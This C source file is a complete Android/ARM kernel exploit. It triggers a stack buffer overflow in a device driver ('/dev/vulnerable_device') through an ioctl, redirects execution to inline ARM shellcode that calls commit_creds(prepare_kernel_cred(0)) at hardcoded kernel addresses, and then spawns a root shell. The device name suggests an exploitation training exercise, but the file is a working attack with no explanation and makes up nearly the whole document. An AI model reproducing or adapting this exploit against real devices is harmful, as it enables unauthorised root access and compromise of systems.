#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#define MAX             64

int open_file(void)
{
        int fd = open("/dev/vulnerable_device", O_RDWR);
        if (fd == -1)
                err(1, "open");
        return fd;
}

void payload(void)
{
                printf("[+] enjoy the shell\n");
                execl("/system/bin/sh", "sh", NULL);
}
extern unsigned int shellCode[];
asm
(
"    .text\n"
"    .align 2\n"
"    .code 32\n"
"    .globl shellCode\n\t"
"shellCode:\n\t"
// commit_creds(prepare_kernel_cred(0));
// -> get root
"LDR     R3, =0xc0039d34\n\t"   //prepare_kernel_cred addr
"MOV     R0, #0\n\t"
"BLX     R3\n\t"
"LDR     R3, =0xc0039834\n\t"   //commit_creds addr
"BLX     R3\n\t"
"mov r3, #0x40000010\n\t"
"MSR    CPSR_c,R3\n\t"
"LDR     R3, =0x879c\n\t"     // payload function addr
"BLX     R3\n\t"
);
void trigger_vuln(int fd)
{
        #define MAX_PAYLOAD (MAX + 2  * sizeof(void*) )
        char buf[MAX_PAYLOAD];
        memset(buf, 'A', sizeof(buf));
        void * pc = buf + MAX +  1 * sizeof(void*);
        printf("shellcdoe addr: %p\n", shellCode);
        printf("payload:%p\n", payload);
        *(void **)pc  = (void *) shellCode;   //ret addr
        /* Kaboom! */
    	ioctl(fd, BUFFER_OVERFLOW, buf);
        //write(fd, buf, sizeof(buf) );
}
int main(void)
{
        int fd;
        fd = open_file();
        trigger_vuln(fd);
        payload();
        close(fd);
}

